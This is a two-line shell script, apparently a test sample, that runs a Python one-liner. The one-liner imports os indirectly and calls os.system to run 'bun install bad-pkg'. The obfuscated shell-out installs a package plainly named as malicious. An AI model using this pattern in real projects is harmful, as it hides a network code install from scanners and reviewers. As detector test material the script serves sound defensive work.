#!/bin/sh
python3 -c "(o:=__import__('os')).system('bun install bad-pkg')"
